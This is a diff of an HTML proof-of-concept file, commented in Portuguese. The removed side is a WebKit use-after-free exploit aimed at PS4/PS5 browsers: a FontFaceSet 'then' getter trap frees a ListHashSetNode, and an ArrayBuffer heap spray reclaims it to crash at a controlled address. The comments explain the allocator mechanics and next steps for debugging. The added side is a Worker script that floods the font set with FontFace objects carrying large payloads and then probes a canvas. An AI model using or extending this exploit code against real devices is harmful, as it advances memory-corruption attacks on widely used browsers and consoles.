@@ -1,328 +1,85 @@
 <!DOCTYPE html>
-<!--
-  PS4/PS5 WebKit — UAF 86074ba — Heap Spray → Crash Controlado
-  
-  OBJETIVO
-  ════════
-  Reclamar o ListHashSetNode liberado por shadowHost.remove() ANTES
-  de ++iterator rodar, preenchendo m_next com 0x4141414141414141.
-  Resultado esperado: SIGSEGV em 0x4141414141414141.
-
-  ESTRUTURA DO ListHashSetNode<WeakPtr<ShadowRoot>> (64-bit, ~24 bytes)
-  ══════════════════════════════════════════════════════════════════════
-  offset  0 │ WeakPtrImpl* m_value │ 8 bytes  ← WeakPtr para ShadowRoot
-  offset  8 │ node*         m_prev │ 8 bytes
-  offset 16 │ node*         m_next │ 8 bytes  ← alvo: lido por ++iterator
-  ──────────────────────────────────────────────────────────────────────
-  Total: 24 bytes → size class 24 no bmalloc
-
-  MECÂNICA DO SPRAY
-  ═════════════════
-  shadowHost.remove()
-    → ShadowRoot removido de m_inDocumentShadowRoots
-    → ListHashSetNode::~ListHashSetNode() → fastFree(nodePtr)
-    → nodePtr vai para o topo da free list de 24 bytes (bmalloc LIFO)
-
-  new ArrayBuffer(24)   ← PRIMEIRA alocação 24 bytes após o free
-    → fastMalloc(24) → retorna nodePtr  (mesmo endereço!)
-    → DataView preenche bytes 0–23 com 0x41
-    → nodePtr + 16 = 0x4141414141414141  (m_next)
-
-  ++iterator  (após getter retornar):
-    m_position = m_position->m_next
-              = *(node**)(nodePtr + 16)
-              = 0x4141414141414141
-
-  Próxima iteração do for-loop:
-    while (it != end)   → 0x4141414141414141 != end → true
-    auto& sr = *it      → lê de 0x4141414141414141
-    → SIGSEGV @ 0x4141414141414141  ✓
-
-  TAMANHOS DO SPRAY
-  ═════════════════
-  Spray cobre tamanhos 16, 24, 32, 40 para acomodar variações
-  no layout exato do node neste build (m_value pode ser 8 ou 16 bytes).
-  Todos preenchidos com 0x41, logo m_next será 0x4141414141414141
-  independente do offset exato.
-
-  CALL STACK ESPERADO NO CRASH
-  ════════════════════════════
-  #0  <SIGSEGV @ 0x4141414141414141>
-  #1  WeakListHashSetIterator<ShadowRoot>::operator++()
-  #2  Style::Scope::flushPendingDescendantUpdates()
-  #3  Style::Scope::update() / Document::resolveStyle()
-  #4  Document::updateLayoutIgnorePendingStylesheets()
-  #5  HTMLElement::offsetWidth getter
-  #6  <JS trap getter> (JS → C++ boundary)
-  ... (completedLoading / JSPromise::resolve / updateActiveStyleSheets)
--->
 <html>
 <head>
-<meta charset="utf-8">
-<title>UAF 86074ba — PS4 heap spray</title>
-<style>
-  body { background: #0d0d0d; color: #ccc; font-family: monospace; padding: 1em; }
-  pre  { font-size: 13px; line-height: 1.5; margin: 0; }
-  .ok  { color: #6f6; }
-  .err { color: #f66; }
-  .hit { color: #ff0; font-weight: bold; }
-  .inf { color: #58f; }
-</style>
+  <meta charset="utf-8">
+  <title>POC Worker self.fonts (sem OffscreenCanvas)</title>
 </head>
 <body>
-<pre id="log"></pre>
-<script>
-(function () {
-"use strict";
+  <button id="runBtn" type="button">Executar POC</button>
+  <pre id="log"></pre>
 
-/* ── log ─────────────────────────────────────────────────────────── */
-var logEl = document.getElementById("log");
-function L(s, cls) {
-  var sp = document.createElement("span");
-  if (cls) sp.className = cls;
-  sp.textContent = s + "\n";
-  logEl.appendChild(sp);
-  console.log(s);
-}
-
-window.addEventListener("load", function () { setTimeout(run, 0); });
-
-/* ── helpers ────────────────────────────────────────────────────── */
-function makeShadowFont(url) {
-  return "@font-face{font-family:'pf';src:url('" + url + "')}" +
-         ":host>span{font-family:'pf';font-size:20px;display:block}";
-}
-
-/* Cria ArrayBuffer de `size` bytes preenchido com byte `fill` (default 0x41).
-   Mantido vivo pelo array `into` para evitar GC.                           */
-function sprayBuf(size, fill, into) {
-  var n = fill === undefined ? 0x41 : fill;
-  var ab = new ArrayBuffer(size);
-  var v  = new Uint8Array(ab);
-  for (var i = 0; i < size; i++) v[i] = n;
-  into.push(ab);
-  return ab;
-}
-
-/* ── main ───────────────────────────────────────────────────────── */
-function run() {
-  L("=== run() — após load event + setTimeout(0) ===");
-
-  /* Referências globais dos objetos de spray — impede GC enquanto
-     ++iterator ainda não rodou.                                      */
-  var SPRAY = [];
-
-  /* ── shadow preamble ─────────────────────────────────────────── */
-  var pre = document.createElement("div");
-  document.body.appendChild(pre);
-  pre.attachShadow({ mode: "open" });
-
-  /* ── shadow alvo ─────────────────────────────────────────────── */
-  var shadowHost = document.createElement("div");
-  document.body.appendChild(shadowHost);
-  var sr = shadowHost.attachShadow({ mode: "open" });
-
-  var style1 = document.createElement("style");
-  style1.textContent = makeShadowFont("resources/Ahem.woff?v=1");
-  sr.appendChild(style1);
-
-  var span = document.createElement("span");
-  span.textContent = "X";
-  sr.appendChild(span);
-
-  /* ── shadow successor ───────────────────────────────────────── */
-  var suf = document.createElement("div");
-  document.body.appendChild(suf);
-  suf.attachShadow({ mode: "open" });
-
-  /* [1] layout → font Loading */
-  void shadowHost.getBoundingClientRect();
-  L("[1] layout forçado — Ahem.woff?v=1 em Loading state", "ok");
-
-  /* [2] FontFaceSet lazy — promise pending */
-  var fs = document.fonts;
-  L("[2] FontFaceSet criado — status=" + fs.status,
-    fs.status === "loading" ? "ok" : "err");
-
-  if (fs.status !== "loading") {
-    L("ABORT: promise já resolvido (ver PoC base para diagnóstico)", "err");
-    return;
-  }
-
-  /* [3] materializa JSPromise */
-  void fs.ready;
-  L("[3] JSPromise materializado via fs.ready (pending)", "ok");
-
-  /* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-     [4] GETTER TRAP — com heap spray integrado
-     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
-  Object.defineProperty(FontFaceSet.prototype, "then", {
-    configurable: true,
-    get: function uafTrap() {
-      L("", "");
-      L("╔══════════════════════════════════════════════════════════╗", "hit");
-      L("║  TRAP DISPARADO — dentro de flushPendingDescendantUpdates║", "hit");
-      L("╚══════════════════════════════════════════════════════════╝", "hit");
-
-      /* ── A. Liberar o ListHashSetNode ─────────────────────────
-         shadowHost.remove() → ShadowRoot sai de m_inDocumentShadowRoots
-         → ~ListHashSetNode() → fastFree(nodePtr)
-         → nodePtr vai ao topo da free list de 24 bytes (bmalloc LIFO) */
-      L("  A) shadowHost.remove() → fastFree(nodePtr) [24-byte free list]", "hit");
-      shadowHost.remove();
-
-      /* ── B. Heap spray — reclamar nodePtr ANTES de ++iterator ──
-         
-         Estratégia:
-           Phase 1 (primário): ArrayBuffer(24) — tamanho exato do node.
-                                PRIMEIRA alocação 24b pós-free → nodePtr.
-                                Preenche m_next @ offset+16 com 0x41414141_41414141.
-
-           Phase 2 (fallback): ArrayBuffer(32) — cobre node de 32 bytes
-                                (caso m_value seja 16 bytes → m_next @ offset+24).
-
-           Phase 3 (fallback): ArrayBuffer(16) e ArrayBuffer(40) — bordas.
-
-         Todos preenchidos com 0x41 — 0x4141414141414141 não é ponteiro válido
-         em nenhum endereço mapeado → SIGSEGV @ 0x4141414141414141.
-
-         Manter todos em SPRAY[] para evitar GC antes de ++iterator.      */
-
-      L("  B) Heap spray — alocando buffers com padrão 0x41...", "hit");
-
-      /* Phase 1: 24 bytes — tamanho mais provável */
-      /* A primeira alocação deve reclamar nodePtr imediatamente (LIFO).  */
-      for (var i = 0; i < 300; i++) sprayBuf(24, 0x41, SPRAY);
-      L("     Phase 1: 300 × ArrayBuffer(24) — 0x41×24", "hit");
-
-      /* Phase 2: 32 bytes — node pode ter padding ou m_value=16 bytes */
-      for (var i = 0; i < 300; i++) sprayBuf(32, 0x41, SPRAY);
-      L("     Phase 2: 300 × ArrayBuffer(32) — 0x41×32", "hit");
-
-      /* Phase 3: bordas — cobre layouts alternativos */
-      for (var i = 0; i < 100; i++) sprayBuf(16, 0x41, SPRAY);
-      for (var i = 0; i < 100; i++) sprayBuf(40, 0x41, SPRAY);
-      L("     Phase 3: 100 × ArrayBuffer(16) + 100 × ArrayBuffer(40)", "hit");
-
-      L("  → spray completo: " + SPRAY.length + " buffers vivos", "hit");
-      L("  → retornando undefined (non-thenable)...", "hit");
-      L("", "");
-
-      /* ── C. Retornar undefined ────────────────────────────────
-         JSPromise vê non-callable → trata fontFaceSet como valor simples
-         → resolve promise normalmente → sem re-entrância.
-         Controle retorna a C++: completedLoading() → flushPendingUpdate()
-         → for-loop → ++iterator lê nodePtr+16 = 0x4141414141414141.    */
-      return undefined;
+  <script>
+    const logEl = document.getElementById('log');
+    function log(msg) {
+      logEl.textContent += msg + '\n';
     }
-  });
-  L("[4] Trap com heap spray instalado", "ok");
 
-  /* [5] enfileirar pending update no shadow */
-  var style2 = document.createElement("style");
-  style2.textContent = makeShadowFont("resources/Ahem.woff?v=2");
-  sr.prepend(style2);
-  L("[5] style2 (?v=2) prepended → m_hasDescendantWithPendingUpdate=true", "ok");
+    const canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    const ctx = canvas.getContext('2d');
 
-  /* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-     [6] TRIGGER — flush síncrono
-     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-     Execução esperada:
-       offsetWidth
-       → updateLayoutIgnorePendingStylesheets()
-       → Scope::flushPendingDescendantUpdates()
-           for (auto& sr : m_document.inDocumentShadowRoots()) {
-             sr.styleScope().flushPendingUpdate()
-             → updateActiveStyleSheets()
-             → remove CSSFontFace(Ahem.woff?v=1, Loading)
-             → m_loadingCount == 0 → completedLoading()
-             → m_readyPromise->resolve(*this)
-             → JSPromise::resolve(fs)
-             → Get(fs, "then")          ← getter [4] dispara aqui
-             → shadowHost.remove()      ← frees nodePtr
-             → spray 300×AB(24)        ← reclaims nodePtr
-             → return undefined
-           }                            ← flushPendingUpdate() retorna
-           ++iterator
-           → m_position = *(node**)(nodePtr + 16)
-           → m_position = 0x4141414141414141
-           while (it != end)  → 0x4141414141414141 != end → true
-           auto& sr = *it
-           → lê de 0x4141414141414141
-           → SIGSEGV @ 0x4141414141414141
-                                                                   */
-  L("[6] Trigger: document.body.offsetWidth ...", "ok");
-  L("    (esperado: SIGSEGV @ 0x4141414141414141)", "inf");
-  L("", "");
-  void document.body.offsetWidth; /* ← CRASH AQUI */
+    const workerSrc = `
+      self.onmessage = async function(ev) {
+        const rounds = ev.data.rounds || 8;
+        const perRound = ev.data.perRound || 75;
+        const payload = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+        let totalAdded = 0;
+        let totalLoaded = 0;
 
-  /* ════════════════════════════════════════════════════════════════
-     Pós-trigger: se chegou aqui, spray não reclamou o slot.
-     Causas possíveis e diagnósticos.
-     ════════════════════════════════════════════════════════════════ */
-  L("--- sem crash via offsetWidth ---", "err");
-  delete FontFaceSet.prototype.then;
+        for (let r = 0; r < rounds; r++) {
+          const promises = [];
+          for (let i = 0; i < perRound; i++) {
+            const fam = 'f_' + r + '_' + i;
+            const ff = new FontFace(fam, payload, { unicodeRange: 'U+13A0-13FF' });
+            self.fonts.add(ff);
+            totalAdded++;
+            promises.push(
+              ff.load().then(
+                function() { totalLoaded++; },
+                function() {}
+              )
+            );
+          }
+          await Promise.all(promises);
+        }
 
-  if (SPRAY.length === 0) {
-    L("DIAGNÓSTICO: getter não foi chamado (cadeia interrompida antes)", "err");
-    return;
-  }
+        self.postMessage({
+          done: true,
+          added: totalAdded,
+          loaded: totalLoaded,
+          fontsSize: self.fonts.size
+        });
+      };
+    `;
 
-  L("DIAGNÓSTICO: getter disparou mas spray não reclamou o nodePtr", "inf");
-  L("  Possíveis causas:", "inf");
-  L("  1. ArrayBuffer backing store usa heap separado do C++ (fastMalloc)", "inf");
-  L("     → testar com spray de shadow roots (mesmo tipo/size class)", "inf");
-  L("  2. Alocações internas de remove() 'roubaram' o slot antes do spray", "inf");
-  L("     → aumentar volume de Phase 1 ou mover shadowHost.remove()", "inf");
-  L("     para o FIM do getter (após o spray)", "inf");
-  L("  3. Node tem tamanho diferente de 16/24/32/40 neste build", "inf");
-  L("     → inspecionar tamanho com heap profiler ou breakpoint", "inf");
+    const blob = new Blob([workerSrc], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    const worker = new Worker(workerUrl);
 
-  /* ── Variante B: remove() DEPOIS do spray ──────────────────── */
-  /* Nesta variante, o spray ocupa memória "fresca" primeiro,      */
-  /* depois o free cria o buraco — e o allocator pode reusar um    */
-  /* ArrayBuffer do spray para o node interno de remove().         */
-  /* Resultado: o "nodePtr" da iteração aponta para um dos         */
-  /* ArrayBuffers de spray → ++iterator lê 0x4141414141414141.    */
-  L("", "");
-  L("--- Tentando variante B: spray ANTES de remove() ---", "inf");
+    function probeMainCanvas() {
+      if (!ctx) return;
+      for (let i = 0; i < 450; i++) {
+        ctx.font = (10 + (i % 20)) + 'px "p_' + i + '", "f_0_0", sans-serif';
+        ctx.measureText('\u13A0\u13A2\u13A4');
+      }
+    }
 
-  /* Reset: re-criar o setup (shadow host já foi removido, criar novo) */
-  var shadowHost2 = document.createElement("div");
-  document.body.appendChild(shadowHost2);
-  var sr2 = shadowHost2.attachShadow({ mode: "open" });
-  var style1b = document.createElement("style");
-  style1b.textContent = makeShadowFont("resources/Ahem.woff?v=3");
-  sr2.appendChild(style1b);
-  var span2 = document.createElement("span");
-  span2.textContent = "Y";
-  sr2.appendChild(span2);
-  void shadowHost2.getBoundingClientRect();
-  L("  shadow2 criado e layout forçado (Ahem.woff?v=3)", "inf");
+    worker.onmessage = function(ev) {
+      log('Worker finalizou: ' + JSON.stringify(ev.data));
+      probeMainCanvas();
+      log('Sondagem em canvas concluida.');
+    };
 
-  /* fs.status pode ser "loaded" agora (promise resolvida após trap).
-     Precisamos de um novo FontFaceSet? Não — o fs existente já serviu
-     seu propósito. Mas completedLoading() agora é no-op (isFulfilled).
-     Para a variante B disparar, precisamos de um caminho diferente
-     que chame completedLoading() numa instância ainda não resolvida.
-     
-     NOTA: a variante B requer reinicialização completa do estado do
-     promise, o que não é trivial sem re-arm de startedLoading().
-     Se chegou aqui, o passo crítico é diagnosticar por que o spray
-     não reclamou o slot na variante A.                               */
-  L("  NOTA: variante B requer análise de heap profiler para confirmar", "inf");
-  L("        tamanho exato do node neste build.", "inf");
-  L("", "");
+    worker.onerror = function(e) {
+      log('Erro no Worker: ' + (e.message || 'desconhecido'));
+    };
 
-  L("═══════════════════════════════════════════════════════", "err");
-  L(" PoC não crashou — spray não reclamou o nodePtr       ", "err");
-  L(" Próximo passo: debugar com heap profiler ou ASAN build", "err");
-  L("═══════════════════════════════════════════════════════", "err");
-  L("SPRAY mantido vivo: " + SPRAY.length + " objetos", "inf");
-  L("document.fonts.status = " + fs.status);
-}
-
-})();
-</script>
+    document.getElementById('runBtn').addEventListener('click', function() {
+      log('Disparando teste...');
+      probeMainCanvas();
+      worker.postMessage({ rounds: 8, perRound: 75 });
+    });
+  </script>
 </body>
 </html>
